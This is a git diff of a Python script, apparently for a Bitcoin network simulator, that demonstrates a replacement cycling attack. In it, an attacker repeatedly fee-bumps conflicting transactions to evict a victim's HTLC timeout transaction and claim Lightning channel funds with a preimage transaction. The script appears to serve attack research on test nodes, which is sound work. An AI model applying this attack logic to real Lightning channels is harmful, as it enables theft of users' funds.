@@ -45,8 +45,13 @@ from test_framework.test_node import (
     TestNode,
 )
 
-SATS_PER_VBYTE_MULTIPLIER_1 = 148
-SATS_PER_VBYTE_MULTIPLIER_2 = 158
+# These transaction size estimates are based on the reported transaction sizes
+# of the corresponding transactions. Will be different in the "real-world".
+PARENT_TX_SIZE_VBYTES_EST = 122
+CHILD_TX_SIZE_VBYTES_EST = 96
+COMMITMENT_TX_SIZE_VBYTES_EST = 149
+TIMEOUT_TX_SIZE_VBYTES_EST = 146
+PREIMAGE_TX_SIZE_VBYTES_EST = 178
 
 @dataclass
 class UTXO:
@@ -109,11 +114,11 @@ class ReplacementCycling1(Commander):
         """
         parser.description = "Demonstrate Replacement Cycling Attack #1"
         parser.usage = "warnet run /path/to/replacement_cycling_1.py"
-        parser.add_argument("--replacement_rounds", type=int, default=2,
+        parser.add_argument("--replacement_rounds", type=int, default=3,
                             help="Number of replacement rounds to simulate.")
-        parser.add_argument("--base_fee", type=int, default=0,
-                            help="Initial fee rate (sats/vbyte) for replacement rounds.")
-        parser.add_argument("--fee_increment", type=int, default=20,
+        parser.add_argument("--base_fee", type=int, default=1,
+                            help="Initial fee rate (sats/vbyte) before the replacement rounds.")
+        parser.add_argument("--fee_increment", type=int, default=10,
                             help="Fee rate increment (sats/vbyte) to apply each replacement round.")
 
     def get_current_block_height(self, query_node: TestNode) -> int:
@@ -251,7 +256,13 @@ class ReplacementCycling1(Commander):
 
         return tx
     
-    def create_replacement_chain_tx(self, signing_wallet: RPCOverloadWrapper, utxo_to_fund: UTXO, sat_per_vbyte: int) -> Tuple[CTransaction, CTransaction]:
+    def create_replacement_chain_tx(
+            self,
+            signing_wallet: RPCOverloadWrapper,
+            utxo_to_fund: UTXO,
+            sat_per_vbyte: int,
+            destination_scriptpubkey: Optional[CScript] = None,
+        ) -> Tuple[CTransaction, CTransaction]:
         """
         From the given utxo create a parent and child transaction to make a replacement chain.
         This transaction will be used as the basis for the Replacement Cycling attack.
@@ -260,11 +271,12 @@ class ReplacementCycling1(Commander):
             signing_wallet: RPCOverloadWrapper instance (wallet RPC wrapper)
             utxo_to_fund: UTXO
             sat_per_vbyte: int (fee in satoshis per vbyte)
+            destination_scriptpubkey: Optional[CScript] - The scriptpubkey of the destination of the child transaction
 
         Returns:
             Tuple[CTransaction, CTransaction] - The parent and child transactions
         """
-        parent_tx_fee = sat_per_vbyte * SATS_PER_VBYTE_MULTIPLIER_2
+        parent_tx_fee = sat_per_vbyte * PARENT_TX_SIZE_VBYTES_EST
         # Probably the simplest script possible, this is a basic
         # P2WSH output that just requires OP_TRUE to be provided in the witness
         # when spent.
@@ -274,24 +286,34 @@ class ReplacementCycling1(Commander):
 
         parent_tx.vin.append(CTxIn(COutPoint(int(utxo_to_fund.txid, 16), utxo_to_fund.vout)))
         parent_tx_amount = int(utxo_to_fund.amount * COIN - parent_tx_fee)
-        self.log.info(f"Parent tx amount: {parent_tx_amount / COIN}")
-        self.log.info(f"Parent tx fee: {parent_tx_fee} sats")
+        self.log.info(f"Parent TX amount: {parent_tx_amount / COIN}")
+        self.log.info(f"Parent TX fee: {parent_tx_fee} sats")
         parent_tx.vout.append(CTxOut(parent_tx_amount, parent_script_pubkey))
         signed_parent_tx = signing_wallet.signrawtransactionwithwallet(parent_tx.serialize().hex())
         signed_parent_tx_ct = tx_from_hex(signed_parent_tx['hex'])
         parent_tx_id = signed_parent_tx_ct.rehash()
+        self.log.info(f"Parent TX size: {signed_parent_tx_ct.get_vsize()} vbytes")
+
+        if destination_scriptpubkey is None:
+            # This spend script is really about creating a valid output for the timeout transaction
+            # in a way that is trivial to satisfy.
+            child_script = CScript([OP_TRUE])
+            spend_scriptpubkey = CScript([OP_0, sha256(child_script)])
+        else:
+            spend_scriptpubkey = destination_scriptpubkey
 
         # The fee amount being paid here is parent_fee + child_fee
-        child_tx_fee = sat_per_vbyte * SATS_PER_VBYTE_MULTIPLIER_1
+        child_tx_fee = sat_per_vbyte * CHILD_TX_SIZE_VBYTES_EST
         child_tx = CTransaction()
         child_tx.vin.append(CTxIn(COutPoint(int(parent_tx_id, 16), 0), b"", 0))
         child_tx_amount = int(utxo_to_fund.amount * COIN - (parent_tx_fee + child_tx_fee))
-        self.log.info(f"Child tx amount: {child_tx_amount / COIN}")
-        self.log.info(f"Child tx fee (includes parent fee): {parent_tx_fee + child_tx_fee} sats")
-        child_tx.vout.append(CTxOut(child_tx_amount, parent_script_pubkey))
+        self.log.info(f"Child TX amount: {child_tx_amount / COIN}")
+        self.log.info(f"Child TX fee (includes parent fee): {parent_tx_fee + child_tx_fee} sats")
+        child_tx.vout.append(CTxOut(child_tx_amount, spend_scriptpubkey))
         child_tx.wit.vtxinwit.append(CTxInWitness())
         child_tx.wit.vtxinwit[0].scriptWitness.stack = [parent_script]
         _ = child_tx.rehash()
+        self.log.info(f"Child TX size: {child_tx.get_vsize()} vbytes")
 
         return (signed_parent_tx_ct, child_tx)
 
@@ -331,7 +353,7 @@ class ReplacementCycling1(Commander):
         htlc_script_pubkey = CScript([OP_0, htlc_witness_program])
 
         # The commitment transaction has a P2WSH output encumbered by the htlc_witness_script
-        commitment_tx_fee = SATS_PER_VBYTE_MULTIPLIER_2 * sat_per_vbyte
+        commitment_tx_fee = COMMITMENT_TX_SIZE_VBYTES_EST * sat_per_vbyte
         commitment_tx = CTransaction()
         commitment_tx.vin.append(CTxIn(COutPoint(int(funding_outpoint['txid'], 16), funding_outpoint['vout']), b"", 0x1))
         commitment_tx_amount = int(input_amount - commitment_tx_fee)
@@ -351,6 +373,7 @@ class ReplacementCycling1(Commander):
             input_script
         ]
         commitment_tx.rehash()
+        self.log.info(f"Commitment TX size: {commitment_tx.get_vsize()} vbytes")
 
         return commitment_tx, commitment_tx_fee
 
@@ -365,6 +388,7 @@ class ReplacementCycling1(Commander):
             sat_per_vbyte: int,
             timelock: int,
             n_sequence: int,
+            destination_scriptpubkey: Optional[CScript] = None,
     ) -> Tuple[CTransaction, int]:
         """
         Create a timeout transaction.
@@ -386,20 +410,22 @@ class ReplacementCycling1(Commander):
             sat_per_vbyte: int - The fee rate in satoshis per vbyte
             timelock: int - after this many blocks, the timeout transaction can be spent
             n_sequence: int - allows RBF
-
+            destination_scriptpubkey: Optional[CScript] - The scriptpubkey of the destination of the timeout transaction
         Returns:
             Tuple[CTransaction, int] - The timeout transaction and the fee paid for the timeout transaction
         """
-        # This spend script is really about creating a valid output for the timeout transactions
-        # in a way that is trivial to satisfy. In the real-world such a trivial script wouldn't be present,
-        # it would be a script representing a spend to a P2WPKH or P2WSH output
-        spend_script = CScript([OP_TRUE])
-        spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])
+        if destination_scriptpubkey is None:
+            # This spend script is really about creating a valid output for the timeout transaction
+            # in a way that is trivial to satisfy.
+            spend_script = CScript([OP_TRUE])
+            spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])
+        else:
+            spend_scriptpubkey = destination_scriptpubkey
 
         # The timeout transaction is the "refund" transaction - the funds will eventually be claimable through
         # the multisig branch of the HTLC after the timelock has expired. The timeout transaction will be used
         # by the funder.
-        timeout_tx_fee = SATS_PER_VBYTE_MULTIPLIER_2 * sat_per_vbyte
+        timeout_tx_fee = TIMEOUT_TX_SIZE_VBYTES_EST * sat_per_vbyte
         timeout_tx = CTransaction()
         timeout_tx.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", n_sequence))
         timeout_tx_amount = int(input_amount - (2 * commitment_tx_fee + timeout_tx_fee))
@@ -421,7 +447,7 @@ class ReplacementCycling1(Commander):
             htlc_witness_script
         ]
         timeout_tx.rehash()
-
+        self.log.info(f"Timeout TX size: {timeout_tx.get_vsize()} vbytes")
         return timeout_tx, timeout_tx_fee
 
     def create_preimage_tx(
@@ -469,7 +495,7 @@ class ReplacementCycling1(Commander):
         # The preimage transaction is the "claim" transaction - the funds will claimable through the
         # the preimage branch of the HTLC after the preimage is provided. The preimage transaction will be used
         # by the fundee.
-        preimage_tx_fee = SATS_PER_VBYTE_MULTIPLIER_1 * sat_per_vbyte
+        preimage_tx_fee = PREIMAGE_TX_SIZE_VBYTES_EST * sat_per_vbyte
         preimage_tx = CTransaction()
         preimage_tx.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", 0))
         preimage_tx.vin.append(CTxIn(COutPoint(int(preimage_parent_tx.hash, 16), 0), b"", 0))
@@ -493,6 +519,7 @@ class ReplacementCycling1(Commander):
         preimage_tx.wit.vtxinwit.append(CTxInWitness())
         preimage_tx.wit.vtxinwit[1].scriptWitness.stack = [parent_tx_script]
         preimage_tx.rehash()
+        self.log.info(f"Pre-image TX size: {preimage_tx.get_vsize()} vbytes")
 
         return preimage_tx, preimage_tx_fee
 
@@ -616,7 +643,7 @@ class ReplacementCycling1(Commander):
         # 2 - Construct Mallory's replacement chain & Lightning channel relationship
         #     transactions: commitment tx, timeout tx, preimage tx
         # ---------------------------------------------------------------------------------
-        section_logger("Construct Mallory's replacement chain")
+        section_logger("Preimage for HTLC and HTLC witness script")
         # Use the current block height as the basis for timeout
         commitment_broadcast_block_height = self.get_current_block_height(alice)
 
@@ -625,11 +652,6 @@ class ReplacementCycling1(Commander):
         hashlock = hash160(preimage)
         self.log.info(f"Preimage: {preimage.hex()}")
         self.log.info(f"Hashlock: {hashlock.hex()}")
-
-        # Mallory creates her replacement chain
-        # The parent is used as an input to her preimage transaction
-        mallory_utxos = [UTXO.from_dict(utxo) for utxo in mallory_wallet.listunspent()]
-        (mallory_replacement_parent_tx, mallory_replacement_child_tx) = self.create_replacement_chain_tx(mallory_wallet, mallory_utxos[0], 1)
 
         htlc_witness_script = self.create_channel_htlc_witness_script(bob_pubkey, mallory_pubkey, hashlock)
 
@@ -650,6 +672,11 @@ class ReplacementCycling1(Commander):
         self.log.info(f"Bob Mallory's commitment tx fee: {bob_mallory_commitment_tx_fee} sats")
 
         section_logger("Create Bob's timeout transaction")
+        # Create a destination for Bob's timeout transaction, so the funds return to Bob's wallet.
+        bob_timeout_addr = bob_wallet.getnewaddress()
+        # Retrieve address info and convert the scriptPubKey
+        addr_info = bob_wallet.getaddressinfo(bob_timeout_addr)
+        bob_timeout_scriptpubkey = CScript(bytes.fromhex(addr_info["scriptPubKey"]))
         bob_timeout_tx, bob_timeout_tx_fee = self.create_timeout_tx(
             bob_mallory_commitment_tx   ,
             bob_mallory_commitment_tx_fee,
@@ -659,7 +686,8 @@ class ReplacementCycling1(Commander):
             int(Decimal('49.99998') * COIN - (Decimal('0.00001') * COIN)),
             2,
             commitment_broadcast_block_height + 20,
-            0x1
+            0x1,
+            bob_timeout_scriptpubkey,
         )
         self.log.info(f"Bob's timeout tx fee: {bob_timeout_tx_fee} sats")
 
@@ -682,61 +710,67 @@ class ReplacementCycling1(Commander):
         mempool_check()
 
         # --------------------------------------------------------------------------
-        # 4 - Start the replacement cycle
+        # 4 - Broadcast Bob's timeout transaction
         # --------------------------------------------------------------------------
-        section_logger("Start the replacement cycle")
-        # Number of rounds and fee parameters from command-line options.
+        section_logger("Broadcast Bob's timeout transaction")
+        bob_timeout_txid = bob.sendrawtransaction(bob_timeout_tx.serialize().hex())
+        self.log.info(f"Bob's timeout TX ID: {bob_timeout_txid}")
+
+        # --------------------------------------------------------------------------
+        # 5 - Replacement cycle: building up fee pressure
+        # --------------------------------------------------------------------------
+        section_logger("Start the replacement cycle: building up fee pressure")
         replacement_rounds = self.options.replacement_rounds
-        base_fee_rate = self.options.base_fee
         fee_increment = self.options.fee_increment
+        current_fee_rate = self.options.base_fee
 
-        current_fee_rate = base_fee_rate
+        mallory_utxos = [UTXO.from_dict(utxo) for utxo in mallory_wallet.listunspent()]
 
+        # Create a destination for Mallory's child transaction, so the funds return to Mallory's wallet.
+        mallory_child_addr = mallory_wallet.getnewaddress()
+        # Retrieve address info and convert the scriptPubKey
+        addr_info = mallory_wallet.getaddressinfo(mallory_child_addr)
+        mallory_child_scriptpubkey = CScript(bytes.fromhex(addr_info["scriptPubKey"]))
+
+        # Mallory will bump the fee rate of her replacement chain each round
         for i in range(replacement_rounds):
             self.log.info(f"----- Replacement Round {i+1} -----")
-            # Bob broadcasts his timeout transaction.
-            bob_timeout_txid = bob.sendrawtransaction(bob_timeout_tx.serialize().hex())
-            self.log.info(f"Round {i+1}: Bob broadcasts his timeout TX with TX ID: {bob_timeout_txid}")
+            self.log.info(f"Using fee rate: {current_fee_rate} sats/vbyte")
 
-            # Mallory reacts with her replacement chain, increasing the fee to outcompete Bob
-            current_fee_rate += fee_increment
-            self.log.info(f"Round {i+1}: Mallory's fee rate: {current_fee_rate} sats/vbyte")
+            # Mallory bumps the fee rate of her replacement chain
             (mallory_replacement_parent_tx, mallory_replacement_child_tx) = self.create_replacement_chain_tx(
                 mallory_wallet,
                 mallory_utxos[0],
-                current_fee_rate
+                current_fee_rate,
+                mallory_child_scriptpubkey
             )
-            replacement_parent_txid = mallory.sendrawtransaction(mallory_replacement_parent_tx.serialize().hex())
-            replacement_child_txid = mallory.sendrawtransaction(mallory_replacement_child_tx.serialize().hex())
-            self.log.info(f"Round {i+1}: Mallory broadcasts replacement chain:"
-                        f" parent TX ID: {replacement_parent_txid}, child TX ID: {replacement_child_txid}")
-
-            # Generate a new timeout transaction with an updated sequence number and increased fee rate
-            # each round to compete with Mallory's replacement chain.
-            if i != replacement_rounds - 1:
-                new_sequence = 0x1 + (i + 1)
-                bob_timeout_tx, bob_timeout_tx_fee = self.create_timeout_tx(
-                    bob_mallory_commitment_tx,
-                    bob_mallory_commitment_tx_fee,
-                    htlc_witness_script,
-                    bob_privkey,
-                    mallory_privkey,
-                    int(Decimal('49.99998') * COIN - (Decimal('0.00001') * COIN)),
-                    current_fee_rate,
-                    commitment_broadcast_block_height + 20,
-                    new_sequence
-                )
-
-                self.log.info(f"Bob's timeout TX fee: {bob_timeout_tx_fee} sats")
+            try:
+                replacement_parent_txid = mallory.sendrawtransaction(mallory_replacement_parent_tx.serialize().hex())
+                replacement_child_txid = mallory.sendrawtransaction(mallory_replacement_child_tx.serialize().hex())
+                self.log.info(f"Round {i+1}: Mallory's replacement chain broadcast successfully:"
+                            f" parent TX ID: {replacement_parent_txid}, child TX ID: {replacement_child_txid}")
+            except Exception as e:
+                self.log.info(f"Round {i+1}: Mallory's replacement chain broadcast failed"
+                              f" parent TX ID: {replacement_parent_txid}, child TX ID: {replacement_child_txid}")
+                self.log.info(f"Broadcast failure: {e}")
+                break
 
             # Sync all mempools and check mempools state
             self.sync_all()
             mempool_check()
 
+            # Increase the fee rate for the next round.
+            current_fee_rate += fee_increment
+
+            last_valid_replacement_parent_tx = mallory_replacement_parent_tx
+
         # --------------------------------------------------------------------------
-        # 5 - Broadcast Mallory's pre-image transaction
+        # 6 - Broadcast Mallory's pre-image transaction
         # --------------------------------------------------------------------------
-        section_logger("Replacement cycle complete, create Mallory's pre-image transaction")
+        section_logger("Replacement cycle has ended")
+        self.log.info(f"Final fee-rate: {current_fee_rate} sats/vbyte")
+        self.log.info("Bob's timeout TX is in the mempool, Mallory's pre-image TX will be broadcast shortly...")
+
         # Create a destination for the final Mallory preimage transaction, so the funds return to Mallory's wallet.
         mallory_preimage_addr = mallory_wallet.getnewaddress()
         # Retrieve address info and convert the scriptPubKey
@@ -748,7 +782,7 @@ class ReplacementCycling1(Commander):
             bob_mallory_commitment_tx,
             bob_mallory_commitment_tx_fee,
             htlc_witness_script,
-            mallory_replacement_parent_tx,
+            last_valid_replacement_parent_tx,
             mallory_privkey,
             int(Decimal('49.99998') * COIN - (Decimal('0.00001') * COIN)),
             current_fee_rate,
@@ -758,19 +792,21 @@ class ReplacementCycling1(Commander):
         self.log.info(f"Final Mallory preimage TX fee: {final_preimage_tx_fee} sats")
 
         section_logger("Broadcast Mallory's pre-image transaction")
-        final_preimage_txid = mallory.sendrawtransaction(final_preimage_tx.serialize().hex())
-        self.log.info(f"Final Mallory preimage TX ID: {final_preimage_txid}")
+        try:
+            final_preimage_txid = mallory.sendrawtransaction(final_preimage_tx.serialize().hex())
+            self.log.info(f"Final Mallory preimage TX ID: {final_preimage_txid}")
+        except Exception as e:
+            self.log.info(f"Final Mallory preimage TX broadcast failed: {e}")
         self.sync_all()
         mempool_check()
         if bob_timeout_txid not in bob.getrawmempool() and bob_timeout_txid not in mallory.getrawmempool():
             self.log.info("Bob's timeout TX is not in any mempool, Mallory's Replacement Cycling Attack will succeed once her pre-image TX has confirmed!")
-
         else:
-            self.log.info("Bob's timeout TX is in at least one mempool, Replacement Cycling Attack has failed!")
+            self.log.info("Bob's timeout TX is in at least one mempool, Mallory's Replacement Cycling Attack has failed!")
         balance_check()
-        # Mine a block to allow the preimage tx to be confirmed
+        # Mine a block to allow either the timeout tx or the preimage tx to be confirmed
         mine_blocks(self, 1) # 321
-        section_logger("Mallory's pre-image TX has now confirmed, she has claimed the channel funds!")
+        section_logger("Final balances")
         self.sync_all()
         mempool_check()
         balance_check()
